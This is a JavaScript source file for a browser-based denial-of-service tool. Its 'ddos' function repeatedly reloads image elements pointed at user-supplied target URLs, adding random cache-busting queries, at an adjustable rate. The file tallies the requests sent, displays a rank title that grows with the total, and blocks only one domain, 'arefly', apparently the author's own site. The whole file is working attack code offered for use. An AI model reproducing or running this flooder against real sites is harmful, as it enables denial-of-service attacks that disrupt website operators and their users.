var target_domain_name = [

];

$(function () {
	var titles = [
	
	],
		board = $('#board'),
		el_Total = $('#total'),
		el_Title = $('#title'),
		disabledSite = {},
		requested = {},
		totalRequest = 0,
		T_img = _.template($('#t-img').html()),
		T_tbody = _.template($('#t-sites').html()),
		rate = 1500,
		timeoutObj = null;
	var iframe_refresh = function (i, url) {
		i = i.toString();
		var random_token = Math.random();
		url += "/?" + random_token.toString(16).substr(2) + '=' + random_token.toString().substr(2);

		if ($('#img-' + i).length == 0) {
			board.append(T_img({i: i, url: url}));
		} else {
			var dom = $('#img-' + i);
			dom.attr('src', url);
		}
	};
	var ddos = function () {
		_.each(target_domain_name, function (url, i) {
			if (typeof disabledSite[i] == 'undefined'
				|| !disabledSite[i]) {
				iframe_refresh(i, url);
				if (!requested[i])
					requested[i] = 0;
				requested[i]++;
				totalRequest++;
			}
		});
		render_rank();
		render_table();
		timeoutObj = setTimeout(ddos, rate);
	};
	var lastLogNum = 0;
	var render_rank = function () {
		el_Total.text(totalRequest);
		var logNum = Math.floor(Math.log(totalRequest)/* * Math.LOG10E*/);
		if (logNum >= titles.length) {
			logNum = titles.length - 1;
		}
		if (logNum != lastLogNum) {
			el_Title.text(titles[logNum])
			lastLogNum = logNum;
		}
	};
	var render_table = function () {
		var data = [];
		_.each(target_domain_name, function (url, i) {
			var row = {};
			row['url'] = url;
			row['id'] = i;
			row['requested'] = requested[i];
			if (typeof disabledSite[i] == 'undefined'
				|| !disabledSite[i]) {
				row['disabled'] = false;
			} else {
				row['disabled'] = true;
			}
			data.push(row);
		});
		$('#sites').html(T_tbody({sites: data}));
	};

	window.toggleStop = function (id) {
		if (disabledSite[id]) {
			disabledSite[id] = false;
		} else {
			disabledSite[id] = true;
		}
		render_table();
	}

	window.addUrl = function () {
		var urls = $('#addurl').val().split("\n");
		target_domain_name = _.union(target_domain_name, urls);
		target_domain_name = _.uniq(target_domain_name);
		target_domain_name = _.without(target_domain_name, '');
		render_table();
	}
	$('#btn-rate').click(function () {
		rate = parseFloat($('#sec').val(), 10) * 1000;
		if ( isNaN(rate) ) {
			rate = 1500;
		}
		if (timeoutObj)
				clearTimeout(timeoutObj);
		ddos();
	});

	$('#btn-start').click(function () {
		addUrl();
		rate = parseFloat($('#sec').val(), 10) * 1000;
		if ( isNaN(rate) ) {
			rate = 1500;
		}
		if (timeoutObj)
				clearTimeout(timeoutObj);
		ddos();
	});
	render_table();
});

document.getElementById("btn-start").onclick=function(){
	var str = document.getElementById("addurl").value;
	if(str.match("arefly")){  					//如果鏈接中含有「arefly」
		alert("別拿AREFLY做實驗哦！");
		document.getElementById("addurl").value = "";			//清空textarea
	}
}